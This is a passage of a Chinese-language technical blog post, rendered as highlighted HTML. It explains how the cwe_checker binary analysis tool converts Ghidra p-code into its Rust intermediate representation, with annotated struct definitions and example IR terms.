class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其中 to_ir_function_terms_map 位于src\cwe_checker_lib\src\ghidra_pcode\program.rs，返回一个 BTreeMap，键是函数的 Tid（线程标识符），值是转换后的 IR 函数项，Program 结构体如下（参考 PcodeRaw 中的 Program）</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[derive(Serialize, Deserialize, Debug, PartialEq, Eq, Clone)]</span><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">Program</span> <span class="token punctuation">&#123;</span>    functions<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Function</span><span class="token operator">></span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Tid 结构体位于 src\cwe_checker_lib\src\intermediate_representation\term.rs</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[derive(Serialize, Deserialize, Debug, PartialEq, Eq, Hash, Clone, PartialOrd, Ord)]</span><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">Tid</span> <span class="token punctuation">&#123;</span>    id<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span>    <span class="token comment">// 唯一标识符</span>    address<span class="token punctuation">:</span> <span class="token class-name">TidAddress</span><span class="token punctuation">,</span><span class="token comment">// 地址</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>to_ir_function_terms_map 函数如下：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">to_ir_function_terms_map</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">BTreeMap</span><span class="token operator">&lt;</span><span class="token class-name">Tid</span><span class="token punctuation">,</span> <span class="token class-name">IrTerm</span><span class="token operator">&lt;</span><span class="token class-name">IrFunction</span><span class="token operator">>></span> <span class="token punctuation">&#123;</span>       <span class="token comment">// 创建一个空的 HashSet 来存储所有跳转目标（类型为 Tid）</span>       <span class="token keyword">let</span> jump_targets<span class="token punctuation">:</span> <span class="token class-name">HashSet</span><span class="token operator">&lt;</span><span class="token class-name">Tid</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token keyword">self</span>           <span class="token punctuation">.</span><span class="token function">blocks</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// 获取程序中所有基本块的迭代器</span>           <span class="token comment">// 收集该块中的所有跳转目标，使用 flat_map 将多个 HashSet 展平为一个 HashSet</span>           <span class="token punctuation">.</span><span class="token function">flat_map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>block<span class="token closure-punctuation punctuation">|</span></span> block<span class="token punctuation">.</span><span class="token function">collect_jmp_targets</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>           <span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将所有跳转目标收集到一个 HashSet 中</span>         <span class="token comment">// 创建一个空的 BTreeMap 来存储转换结果，键是函数 Tid，值是 IR 函数项</span>       <span class="token keyword">let</span> ret<span class="token punctuation">:</span> <span class="token class-name">BTreeMap</span><span class="token operator">&lt;</span><span class="token class-name">Tid</span><span class="token punctuation">,</span> <span class="token class-name">IrTerm</span><span class="token operator">&lt;</span><span class="token class-name">IrFunction</span><span class="token operator">>></span> <span class="token operator">=</span> <span class="token keyword">self</span>           <span class="token punctuation">.</span><span class="token function">functions</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// 获取程序中所有函数的引用</span>           <span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">// 获取函数的迭代器</span>           <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>function<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span><span class="token comment">// 对每个函数进行转换操作，转换成 IR 函数项</span>               <span class="token comment">// 传入之前收集的跳转目标集合，用于在转换过程中识别有效的跳转目标</span>               <span class="token keyword">let</span> ir_function_term <span class="token operator">=</span> function<span class="token punctuation">.</span><span class="token function">to_ir_function_term</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>jump_targets<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">// 返回一个元组：(函数的 Tid, IR 函数项)</span>               <span class="token punctuation">(</span>ir_function_term<span class="token punctuation">.</span>tid<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ir_function_term<span class="token punctuation">)</span>           <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>           <span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将迭代器中的所有元组收集到 BTreeMap 中</span>         <span class="token comment">// 验证转换结果的完整性，断言原始函数数量应该等于转换后的函数数量</span>       <span class="token comment">// 如果数量不相等，说明存在重复的函数 TID（这不应该发生）</span>       <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>functions<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ret<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Duplicate function TID."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// 返回转换后的函数映射表</span>       ret   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>to_ir_function_term 位于 src\cwe_checker_lib\src\ghidra_pcode\function\mod.rs</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">to_ir_function_term</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> jump_targets<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">HashSet</span><span class="token operator">&lt;</span><span class="token class-name">Tid</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">IrTerm</span><span class="token operator">&lt;</span><span class="token class-name">IrFunction</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>       <span class="token comment">// 创建 IrFunction (Sub) 结构体</span>       <span class="token keyword">let</span> ir_function_term <span class="token operator">=</span> <span class="token class-name">IrFunction</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">::</span><span class="token operator">&lt;</span>_<span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token operator">></span><span class="token punctuation">(</span>           <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span><span class="token comment">// 函数名称</span>           <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">blocks</span><span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token punctuation">.</span><span class="token function">flat_map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>block<span class="token closure-punctuation punctuation">|</span></span> block<span class="token punctuation">.</span><span class="token function">to_ir_blocks</span><span class="token punctuation">(</span>jump_targets<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">into_iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>               <span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">// 将每个基本块转换为 IR 基本块列表</span>           <span class="token class-name">None</span><span class="token punctuation">,</span>   <span class="token comment">// 调用约定设为未知</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// 使用函数地址创建 Tid，然后包装为 IrTerm</span>       <span class="token class-name">IrTerm</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">Tid</span><span class="token punctuation">::</span><span class="token function">new_function</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">,</span> ir_function_term<span class="token punctuation">)</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>IrTerm 结构体位于 src\cwe_checker_lib\src\ghidra_pcode\term.rs（mod.rs 中被重命名）</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[derive(Serialize, Deserialize, Debug, PartialEq, Eq, Hash, Clone)]</span><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">Term</span> <span class="token punctuation">&#123;</span>    address<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span>    index<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>    operation<span class="token punctuation">:</span> <span class="token class-name">PcodeOperation</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>IrFunction 结构体位于 src\cwe_checker_lib\src\intermediate_representation\sub.rs（mod.rs 中被重命名）</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// 子程序可以有多个出口，这些出口由 `Jmp::Return` 指令标识。</span><span class="token attribute attr-name">#[derive(Serialize, Deserialize, Debug, PartialEq, Eq, Hash, Clone)]</span><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">Sub</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">pub</span> name<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span><span class="token comment">// 子程序的名称</span>    <span class="token keyword">pub</span> blocks<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Term</span><span class="token operator">&lt;</span><span class="token class-name">Blk</span><span class="token operator">>></span><span class="token punctuation">,</span><span class="token comment">// 属于该子程序的基本块，第一个块也是子程序的入口点</span>    <span class="token keyword">pub</span> calling_convention<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">String</span><span class="token operator">></span><span class="token punctuation">,</span><span class="token comment">// 用于调用该函数的调用约定，如果已知</span>    non_returning<span class="token punctuation">:</span> <span class="token keyword">bool</span><span class="token punctuation">,</span><span class="token comment">// 如果函数不返回则为 true</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Blk 结构体位于 src\cwe_checker_lib\src\intermediate_representation\blk.rs</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[derive(Serialize, Deserialize, Debug, PartialEq, Eq, Hash, Clone)]</span><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">Blk</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">pub</span> defs<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Term</span><span class="token operator">&lt;</span><span class="token class-name">Def</span><span class="token operator">>></span><span class="token punctuation">,</span><span class="token comment">// 按执行顺序的 Def 指令</span>    <span class="token keyword">pub</span> jmps<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Term</span><span class="token operator">&lt;</span><span class="token class-name">Jmp</span><span class="token operator">>></span><span class="token punctuation">,</span><span class="token comment">// 数量为 0-2 个，对应 无法确定下一个指令 / 无条件 / 有条件跳转</span>    indirect_control_flow_targets<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">IndirectCfTargets</span><span class="token operator">>></span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中 def 和 jmp 枚举类型如下：</p><p>Def：加载和存储表达式</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">enum</span> <span class="token type-definition class-name">Def</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Load</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 将内存加载到由 var 指定的寄存器中</span>        var<span class="token punctuation">:</span> <span class="token class-name">Variable</span><span class="token punctuation">,</span>        <span class="token comment">// 内存加载的目标寄存器，var 的大小决定了从内存中读取的字节数</span>        address<span class="token punctuation">:</span> <span class="token class-name">Expression</span><span class="token punctuation">,</span>    <span class="token comment">// 计算读取地址的表达式</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token class-name">Store</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 一个内存存储操作</span>        address<span class="token punctuation">:</span> <span class="token class-name">Expression</span><span class="token punctuation">,</span>     <span class="token comment">// 计算写入地址的表达式</span>        value<span class="token punctuation">:</span> <span class="token class-name">Expression</span><span class="token punctuation">,</span>       <span class="token comment">// 计算写入内存的值的表达式</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token class-name">Assign</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 寄存器分配，将表达式 value 的结果分配给寄存器 var </span>        var<span class="token punctuation">:</span> <span class="token class-name">Variable</span><span class="token punctuation">,</span>    <span class="token comment">// 被写入的寄存器</span>        value<span class="token punctuation">:</span> <span class="token class-name">Expression</span><span class="token punctuation">,</span><span class="token comment">// 计算分配给寄存器的值的表达式</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Jmp：影响程序的执行流程</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">enum</span> <span class="token type-definition class-name">Jmp</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Branch</span><span class="token punctuation">(</span><span class="token class-name">Tid</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment">// 直接在过程内跳转到目标 Blk 术语标识符</span>    <span class="token class-name">BranchInd</span><span class="token punctuation">(</span><span class="token class-name">Expression</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">// 间接在过程内跳转到给定表达式求值后的地址</span>    <span class="token class-name">CBranch</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 符合条件时跳转</span>        target<span class="token punctuation">:</span> <span class="token class-name">Tid</span><span class="token punctuation">,</span><span class="token comment">// 跳转目标块的术语 ID</span>        condition<span class="token punctuation">:</span> <span class="token class-name">Expression</span><span class="token punctuation">,</span> <span class="token comment">// 跳转条件</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token class-name">Call</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 过程间跳转，表示子程序调用</span>        target<span class="token punctuation">:</span> <span class="token class-name">Tid</span><span class="token punctuation">,</span>    <span class="token comment">// 目标子程序（ Sub ）或调用外部符号的术语 ID</span>        return_<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Tid</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token comment">// 被调用函数返回的块的术语 ID，永不返回，则可能是 None</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token class-name">CallInd</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 一个间接的跨过程跳转到 target 表达式求值后的地址，表示子程序调用</span>        target<span class="token punctuation">:</span> <span class="token class-name">Expression</span><span class="token punctuation">,</span><span class="token comment">// 计算调用目标地址的表达式</span>        return_<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Tid</span><span class="token operator">></span><span class="token punctuation">,</span><span class="token comment">// 被调用函数返回的块的术语 ID，永不返回，则可能是 None</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token class-name">Return</span><span class="token punctuation">(</span><span class="token class-name">Expression</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">// 从子程序返回的间接跨过程跳转</span>    <span class="token class-name">CallOther</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 其他指令无法表示或不被反汇编器支持的副作用</span>        description<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span><span class="token comment">// 对副作用的描述</span>        return_<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Tid</span><span class="token operator">></span><span class="token punctuation">,</span><span class="token comment">// 反汇编器假定在处理副作用后执行将继续的代码块的块术语标识符</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将 pcode 操作转化为 IR Def 示例：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// 原始 pcode 操作，参考 PcodeRaw 结构体</span><span class="token class-name">Term</span> <span class="token punctuation">&#123;</span>    address<span class="token punctuation">:</span> <span class="token string">"0x00401000"</span><span class="token punctuation">,</span>    index<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    operation<span class="token punctuation">:</span> <span class="token class-name">PcodeOperation</span> <span class="token punctuation">&#123;</span><span class="token comment">// rsp = rsp - 8</span>        opcode<span class="token punctuation">:</span> <span class="token class-name">Expression</span><span class="token punctuation">(</span><span class="token class-name">IntSub</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">// 操作：sub</span>        output<span class="token punctuation">:</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Varnode</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token string">"temp_RSP_new"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">// 输出：rsp</span>        inputs<span class="token punctuation">:</span> <span class="token punctuation">[</span>            <span class="token class-name">Varnode</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token string">"register_RSP_64"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">// 输入：rsp</span>            <span class="token class-name">Varnode</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token string">"const_8_64"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">// 8</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token comment">// 转换为 IR Def</span><span class="token class-name">Term</span><span class="token operator">&lt;</span><span class="token class-name">Def</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    tid<span class="token punctuation">:</span> <span class="token class-name">Tid</span> <span class="token punctuation">&#123;</span>        id<span class="token punctuation">:</span> <span class="token string">"instr_0x00401000_0"</span><span class="token punctuation">,</span>   <span class="token comment">// tid</span>        address<span class="token punctuation">:</span> <span class="token class-name">TidAddress</span><span class="token punctuation">(</span><span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">0x00401000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">// 程序地址</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    term<span class="token punctuation">:</span> <span class="token class-name">Def</span><span class="token punctuation">::</span><span class="token class-name">Assign</span> <span class="token punctuation">&#123;</span>        var<span class="token punctuation">:</span> <span class="token class-name">Variable</span> <span class="token punctuation">&#123;</span> name<span class="token punctuation">:</span> <span class="token string">"temp_RSP_new"</span><span class="token punctuation">,</span> size<span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">,</span> is_temp<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        value<span class="token punctuation">:</span> <span class="token class-name">Expression</span><span class="token punctuation">::</span><span class="token class-name">BinOp</span> <span class="token punctuation">&#123;</span>            op<span class="token punctuation">:</span> <span class="token class-name">IntSub</span><span class="token punctuation">,</span><span class="token comment">// 操作：sub</span>            lhs<span class="token punctuation">:</span> <span class="token class-name">Expression</span><span class="token punctuation">::</span><span class="token class-name">Var</span><span class="token punctuation">(</span><span class="token class-name">Variable</span> <span class="token punctuation">&#123;</span> name<span class="token punctuation">:</span> <span class="token string">"register_RSP_64"</span><span class="token punctuation">,</span> size<span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">,</span> is_temp<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">// 左操作数，64 位寄存器 rsp，大小为 8，是临时寄存器</span>            rhs<span class="token punctuation">:</span> <span class="token class-name">Expression</span><span class="token punctuation">::</span><span class="token class-name">Const</span><span class="token punctuation">(</span><span class="token class-name">Bitvector</span><span class="token punctuation">::</span><span class="token function">from_u64</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">// 右操作数，常数 8</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>IrFunction 示例：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token class-name">IrTerm</span><span class="token operator">&lt;</span><span class="token class-name">IrFunction</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    tid<span class="token punctuation">:</span> <span class="token class-name">Tid</span> <span class="token punctuation">&#123;</span>        id<span class="token punctuation">:</span> <span class="token string">"fun_0x00401000"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">// 格式: "fun_&#123;地址&#125;"</span>        address<span class="token punctuation">:</span> <span class="token class-name">TidAddress</span><span class="token punctuation">(</span><span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">0x00401000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    term<span class="token punctuation">:</span> <span class="token class-name">Sub</span> <span class="token punctuation">&#123;</span>        name<span class="token punctuation">:</span> <span class="token string">"example_function"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        blocks<span class="token punctuation">:</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span>            <span class="token class-name">Term</span><span class="token operator">&lt;</span><span class="token class-name">Blk</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>                tid<span class="token punctuation">:</span> <span class="token class-name">Tid</span> <span class="token punctuation">&#123;</span>                    id<span class="token punctuation">:</span> <span class="token string">"blk_0x00401000"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    address<span class="token punctuation">:</span> <span class="token class-name">TidAddress</span><span class="token punctuation">(</span><span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">0x00401000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                term<span class="token punctuation">:</span> <span class="token class-name">Blk</span> <span class="token punctuation">&#123;</span>                    defs<span class="token punctuation">:</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span>                        <span class="token comment">// 操作 1：计算 RSP - 8</span>                        <span class="token class-name">Term</span><span class="token operator">&lt;</span><span class="token class-name">Def</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>                            tid<span class="token punctuation">:</span> <span class="token class-name">Tid</span> <span class="token punctuation">&#123;</span>                                id<span class="token punctuation">:</span> <span class="token string">"instr_0x00401000_0"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                address<span class="token punctuation">:</span> <span class="token class-name">TidAddress</span><span class="token punctuation">(</span><span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">0x00401000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                            term<span class="token punctuation">:</span> <span class="token class-name">Def</span><span class="token punctuation">::</span><span class="token class-name">Assign</span> <span class="token punctuation">&#123;</span>                                var<span class="token punctuation">:</span> <span class="token class-name">Variable</span> <span class="token punctuation">&#123;</span>                                    name<span class="token punctuation">:</span> <span class="token string">"temp_RSP_new"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                    size<span class="token punctuation">:</span> <span class="token class-name">ByteSize</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                    is_temp<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                                value<span class="token punctuation">:</span> <span class="token class-name">Expression</span><span class="token punctuation">::</span><span class="token class-name">BinOp</span> <span class="token punctuation">&#123;</span>                                    op<span class="token punctuation">:</span> <span class="token class-name">BinOpType</span><span class="token punctuation">::</span><span class="token class-name">IntSub</span><span class="token punctuation">,</span>                                    lhs<span class="token punctuation">:</span> <span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">Expression</span><span class="token punctuation">::</span><span class="token class-name">Var</span><span class="token punctuation">(</span><span class="token class-name">Variable</span> <span class="token punctuation">&#123;</span>                                        name<span class="token punctuation">:</span> <span class="token string">"register_RSP_64"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                        size<span class="token punctuation">:</span> <span class="token class-name">ByteSize</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                        is_temp<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>                                    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                    rhs<span class="token punctuation">:</span> <span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">Expression</span><span class="token punctuation">::</span><span class="token class-name">Const</span><span class="token punctuation">(</span><span class="token class-name">Bitvector</span><span class="token punctuation">::</span><span class="token function">from_u64</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                        <span class="token comment">// 操作 2：更新 RSP</span>                        <span class="token class-name">Term</span><span class="token operator">&lt;</span><span class="token class-name">Def</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>                            tid<span class="token punctuation">:</span> <span class="token class-name">Tid</span> <span class="token punctuation">&#123;</span>                                id<span class="token punctuation">:</span> <span class="token string">"instr_0x00401000_1"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                address<span class="token punctuation">:</span> <span class="token class-name">TidAddress</span><span class="token punctuation">(</span><span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">0x00401000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                            term<span class="token punctuation">:</span> <span class="token class-name">Def</span><span class="token punctuation">::</span><span class="token class-name">Assign</span> <span class="token punctuation">&#123;</span>                                var<span class="token punctuation">:</span> <span class="token class-name">Variable</span> <span class="token punctuation">&#123;</span>                                    name<span class="token punctuation">:</span> <span class="token string">"register_RSP_64"</span><span class="token punctuation">.</span><span class="token 